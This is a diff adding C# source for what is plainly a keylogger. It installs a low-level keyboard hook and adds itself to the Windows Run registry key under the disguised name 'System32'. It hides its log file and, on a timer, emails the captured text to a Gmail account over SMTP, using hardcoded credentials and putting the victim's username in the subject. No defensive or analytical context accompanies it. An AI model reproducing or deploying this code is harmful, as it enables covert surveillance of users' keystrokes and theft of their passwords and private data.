@@ -1,0 +1,84 @@
+public void InternetControl()
+        {
+
+            bool fileState;
+            string fileDirectory = AppDomain.CurrentDomain.BaseDirectory.ToString() + "mylog.txt";
+            if (File.Exists(fileDirectory) == true)
+            {
+                fileState = true;
+            }
+            else
+            {
+                fileState = false;
+                TextWriter tb = new StreamWriter(address);
+                tb.Write("#" + today.ToShortDateString() + "/" + today.ToShortTimeString() + "-", true);
+                tb.Close();
+            }
+            File.SetAttributes(address, FileAttributes.Normal);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            key.SetValue("System32", "\"" + Application.ExecutablePath + "\"");
+
+            sc.Port = 587;
+            sc.Host = "smtp.gmail.com";
+            sc.EnableSsl = true;
+            sc.Credentials = new NetworkCredential("systemlog@gmail.com", "systemlog");
+
+            mail.From = new MailAddress("systemlog@gmail.com", Dns.GetHostName());
+            mail.To.Add("systemlog@gmail.com");
+            mail.Subject = Environment.UserName;
+            mail.IsBodyHtml = true;
+
+            StreamReader read = File.OpenText(address);
+            string newText, text = "";
+            while ((newText = read.ReadLine()) != null)
+            {
+                text += newText;
+            }
+            read.Close();
+            mail.Body = text;
+            try
+            {
+                System.Net.Sockets.TcpClient kontrol_client = new System.Net.Sockets.TcpClient("www.google.com.tr", 80);
+                kontrol_client.Close();
+                if (fileState == true)
+                {
+                    sc.Send(mail);
+                    TextWriter tb = new StreamWriter(address);
+                    tb.Write("#" + today.ToShortDateString() + "/" + today.ToShortTimeString() + "-", true);
+                    tb.Close();
+                }
+            }
+            catch
+            {
+                StreamWriter output = new StreamWriter(address, true);
+                output.Write("\n#" + today.ToShortDateString() + "/" + today.ToShortTimeString() + "-");
+                output.Close();
+            }
+            File.SetAttributes(address, FileAttributes.Hidden);
+        }
+
+	private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            Process currentProcess = Process.GetCurrentProcess();
+            ProcessModule currentModule = currentProcess.MainModule;
+            String moduleName = currentModule.ModuleName;
+            IntPtr moduleHandle = GetModuleHandle(moduleName);
+            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
+        }
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll")]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(String lpModuleName);
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            InternetControl();
+        }
